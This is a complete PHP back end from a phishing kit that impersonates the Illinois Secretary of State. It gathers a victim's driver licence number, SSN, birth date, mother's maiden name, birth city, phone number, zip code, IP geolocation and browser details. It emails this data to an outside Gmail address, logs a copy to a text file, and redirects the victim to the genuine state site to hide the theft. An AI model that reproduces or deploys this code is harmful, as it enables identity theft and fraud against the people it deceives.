<?php
$mail = $_POST['dl'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$to = "dorislandon8@gmail.com";
$subject = "Illinois SS $ip | $mail";

$message = "===================+ LOGS +====================== <br>\n";

$message .= "Driver License: ".$_POST['dl']." <br>\n";
$message .= "First Name: ".$_POST['fn']." <br>\n";
$message .= "Last Name: ".$_POST['ln']." <br>\n";
$message .= "SSN: ".$_POST['ssn']." <br>\n";
$message .= "MM: ".$_POST['mm']." <br>\n";
$message .= "DD: ".$_POST['dd']." <br>\n";
$message .= "YYYY: ".$_POST['yy']." <br>\n";
$message .= "Weight: ".$_POST['weight']." <br>\n";
$message .= "Height: ".$_POST['height']." <br>\n";
$message .= "What is your mother's maiden name?: ".$_POST['maiden']." <br>\n";
$message .= "In what city were you born?: ".$_POST['borncity']." <br>\n";
$message .= "Mobile Number: ".$_POST['mobile']." <br>\n";
$message .= "Zip Code: ".$_POST['zip']." <br>\n";
$message .= 	"IP: {$geoplugin->ip} <br>\n";
$message .= 	"City: {$geoplugin->city} <br>\n";
$message .= 	"Region: {$geoplugin->region} <br>\n";
$message .= 	"Country Name: {$geoplugin->countryName} <br>\n";
$message .= 	"Country Code: {$geoplugin->countryCode} <br>\n";
$message .= 	"User-Agent: ".$browser." <br>\n";
$message.= "Date Log  : ".$date." <br>\n";
$message.= "Time Log  : ".$time." <br>\n";
$message .= "============= [ New Result Info ] ============= <br>\n";

// Always set content-type when sending HTML email
$headers .= "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: Illinois SS <webmaster@example.com>' . "\r\n";
mail($to,$subject,$message,$headers);

$fp = fopen("backupresultsxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: https://www2.illinois.gov/agencies/SOS");
?> 


<script language="JavaScript">
<!-- 
setTimeout ("changePage()", 1000);
function changePage() {
if (self.parent.frames.length != 0)
self.parent.location="https://www2.illinois.gov/agencies/SOS";
}
// -->
</script>

